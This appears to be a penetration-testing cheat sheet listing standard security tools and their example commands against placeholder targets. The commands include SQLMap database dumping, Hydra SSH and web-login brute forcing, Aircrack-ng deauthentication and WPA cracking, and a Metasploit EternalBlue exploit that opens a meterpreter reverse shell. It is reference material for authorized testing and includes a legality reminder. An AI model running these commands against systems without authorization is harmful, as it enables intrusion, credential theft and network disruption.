# AVIOS Security Tools Reference

## Network Analysis & Scanning

### Nmap
Network scanner for discovering hosts and services.
```bash
# Quick scan
nmap 192.168.1.0/24

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A -T4 192.168.1.1

# Scan all ports
nmap -p- 192.168.1.1
```

### Masscan
Fast port scanner for large networks.
```bash
# Scan ports on large network
masscan 10.0.0.0/8 -p80,443

# Scan at max speed
masscan 192.168.1.0/24 -p1-65535 --rate=100000
```

### Wireshark / TShark
Packet analyzer for network troubleshooting and analysis.
```bash
# Capture on interface
tshark -i eth0

# Capture with filter
tshark -i eth0 -f "port 80"

# Read pcap file
tshark -r capture.pcap

# Display HTTP traffic
tshark -r capture.pcap -Y "http"
```

## Web Application Testing

### SQLMap
Automatic SQL injection and database takeover tool.
```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page?id=1"

# Test with POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=admin"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump database
sqlmap -u "http://target.com/page?id=1" -D dbname --dump
```

### Nikto
Web server scanner.
```bash
# Scan web server
nikto -h http://target.com

# Scan with SSL
nikto -h https://target.com

# Save output
nikto -h http://target.com -o results.txt
```

### Gobuster
Directory/file brute-forcer.
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Virtual host enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/vhosts.txt
```

## Password Cracking

### John the Ripper
Password cracker supporting various formats.
```bash
# Crack password hashes
john hashes.txt

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack specific format
john --format=raw-md5 hashes.txt
```

### Hashcat
Advanced password recovery.
```bash
# MD5 hash cracking
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# WPA/WPA2 cracking
hashcat -m 2500 capture.hccapx wordlist.txt

# Brute force attack
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
```

### Hydra
Network logon cracker.
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
```

## Wireless Security

### Aircrack-ng Suite
Complete wireless auditing suite.

#### Monitor mode
```bash
# Enable monitor mode
airmon-ng start wlan0

# Check status
airmon-ng
```

#### Capture packets
```bash
# Capture on specific channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Capture all channels
airodump-ng wlan0mon
```

#### Deauthentication attack
```bash
# Deauth specific client
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Deauth all clients
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

#### Crack WPA/WPA2
```bash
# Crack with wordlist
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap

# Crack with custom wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

## Exploitation

### Metasploit Framework
Complete penetration testing platform.
```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows

# Use an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Set options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

## Information Gathering

### theHarvester
OSINT tool for gathering emails, subdomains, IPs.
```bash
# Search with all sources
theharvester -d target.com -b all

# Search specific source
theharvester -d target.com -b google

# Limit results
theharvester -d target.com -b all -l 500
```

### Whois
Domain registration information.
```bash
# Query domain
whois target.com

# Query IP
whois 8.8.8.8
```

### DNSEnum
DNS enumeration tool.
```bash
# Basic enumeration
dnsenum target.com

# With wordlist
dnsenum --enum target.com -f subdomains.txt
```

## Forensics

### Binwalk
Firmware analysis tool.
```bash
# Analyze firmware
binwalk firmware.bin

# Extract files
binwalk -e firmware.bin

# Entropy analysis
binwalk -E firmware.bin
```

### Volatility
Memory forensics framework.
```bash
# Identify image info
volatility -f memory.dump imageinfo

# List processes
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Dump process
volatility -f memory.dump --profile=Win7SP1x64 memdump -p 1234 -D output/
```

## Reverse Engineering

### Radare2
Reverse engineering framework.
```bash
# Analyze binary
r2 binary

# Analyze functions
r2> aaa

# List functions
r2> afl

# Disassemble
r2> pdf @ main
```

### GDB
GNU Debugger.
```bash
# Debug program
gdb ./program

# Set breakpoint
(gdb) break main

# Run program
(gdb) run

# Step through
(gdb) step
(gdb) next

# Examine memory
(gdb) x/10x $rsp
```

## General Tips

### Stay Legal
- Only test systems you own or have explicit permission to test
- Obtain written authorization before any penetration testing
- Respect privacy and data protection laws

### Wordlists
Common wordlist locations:
- `/usr/share/wordlists/rockyou.txt` - Common passwords
- `/usr/share/wordlists/dirb/` - Directory enumeration
- `/usr/share/wordlists/metasploit/` - Metasploit wordlists

### Reporting
Always document:
- Scope and objectives
- Methodology used
- Findings and evidence
- Risk ratings
- Remediation recommendations

## Additional Resources

- OWASP Testing Guide
- NIST Cybersecurity Framework
- PTES (Penetration Testing Execution Standard)
- Kali Linux Documentation
